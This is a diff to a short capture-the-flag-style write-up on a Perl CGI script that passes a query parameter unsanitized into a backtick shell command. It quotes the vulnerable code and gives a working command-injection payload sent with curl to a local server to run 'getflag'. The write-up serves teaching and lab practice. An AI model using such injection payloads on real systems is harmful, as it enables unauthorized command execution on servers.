@@ -1,4 +1,4 @@
-At the home of the user is present a .pl file :
+At the user's home, there is a .pl file:
 
 ```perl
   use CGI qw{param};
@@ -10,13 +10,13 @@ At the home of the user is present a .pl file :
   x(param("x"));
 ```
 
-In Perl, CGI(Common Gateway Interface) is a protocol for executing scripts via web requests
-This one is printing the first query parameter x -> $_[0] to the standard output using the built-in echo
+In Perl, CGI (Common Gateway Interface) is a protocol for executing scripts via web requests. 
+This script prints the first query parameter x -> $_[0] to the standard output using the system `echo`.
 
-During the substitution of the variable $y there is no sanitization
-By adding "\`" i can close the backtick command and open and other one "\`"
+However, during the substitution of the variable $y, there is no sanitization. By adding `&(getflag)` i can use the command substitution
+to execute a command and give the result to echo.
 
-The final payload is \`getflag\` to execute -> "`echo ` `getflag 2>&1`"
-
-I send it with the curl command (backslash added to stop interpretation of backtick from my own shell):
-curl -v http://localhost:4747/?x=\`getflag\`
+I send it with the curl command:
+```bash
+curl 'http://localhost:4747/?x=$(getflag)'
+```
